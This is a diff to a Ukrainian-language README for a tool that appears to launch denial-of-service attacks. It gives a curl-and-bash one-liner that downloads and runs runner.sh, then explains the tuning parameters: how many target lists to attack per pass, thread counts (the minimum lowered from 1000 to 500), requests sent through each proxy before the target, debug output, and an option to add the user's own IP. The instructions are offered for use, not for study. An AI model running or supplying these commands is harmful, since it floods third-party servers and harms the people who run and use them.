@@ -53,9 +53,9 @@ curl -LO https://raw.githubusercontent.com/alexnest-ua/runner_for_windows/main/r
 ***щоб зупинити процес - натисніть Ctrl+C (або якщо не спрацює просто закрийте вікно з атакою)***  
 
 **!!!УВАГА!!!** runner.sh підтримує наступні параметри (САМЕ У ТАКОМУ ПОРЯДКУ ТА ЛИШЕ У ТАКІЙ КІЛЬКОСТІ(мінімум 3)), але можно і без них:  
-`curl -LO https://raw.githubusercontent.com/alexnest-ua/runner_for_windows/main/runner.sh && bash runner.sh` [num_of_copies] [threads] [rpc] [debug] [vpn]  
+`curl -LO https://raw.githubusercontent.com/alexnest-ua/runner_for_windows/main/runner.sh && bash runner.sh [num_of_copies] [threads] [rpc] [debug] [vpn]`  
 - num_of_copies - кількість атакуємих списків цілей за один прохід (але не менше 1, та не більше 3, бо більше 3-ох знижує ефективність)
-- threads - кількість потоків (але не менше 1000, та не більше 5000)
+- threads - кількість потоків (але не менше 500, та не більше 5000)
 - rpc - кількість запитів на проксі перед відправкою на ціль (але не менше 1000, та не більше 2500)
 - debug - можливість дебагу (якщо хочете бачити повний інфу по атаці - у 4-ий параметр додайте --debug)
 - vpn - використання вашого ІР у атаці разом з проксі
